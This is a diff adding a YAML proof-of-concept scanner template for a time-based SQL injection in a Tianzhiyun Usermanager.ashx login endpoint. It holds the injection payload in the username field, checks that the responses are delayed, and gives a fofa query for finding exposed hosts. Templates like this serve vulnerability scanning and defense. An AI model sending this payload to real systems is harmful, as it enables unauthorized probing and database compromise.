@@ -1,0 +1,31 @@
+name: poc-yaml-tianzhiyun-Usermanager-sql-injection
+transport: http
+
+
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /Ashx/Usermanager.ashx
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: type=LOGIN&username=1') AND 8645=DBMS_PIPE.RECEIVE_MESSAGE(CHR(110),3)--&pwd=1&vendor=
+    expression: response.status == 200 && response.latency >= 3000 && response.latency <= 4000
+  r1:
+    request:
+      method: POST
+      path: /Ashx/Usermanager.ashx
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: type=LOGIN&username=1') AND 8645=DBMS_PIPE.RECEIVE_MESSAGE(CHR(110),6)--&pwd=1&vendor=
+    expression: response.status == 200 && response.latency >= 6000 && response.latency <= 7000
+
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/139512441
+# fofa: body="Ashx/Usermanager.ashx" 
+
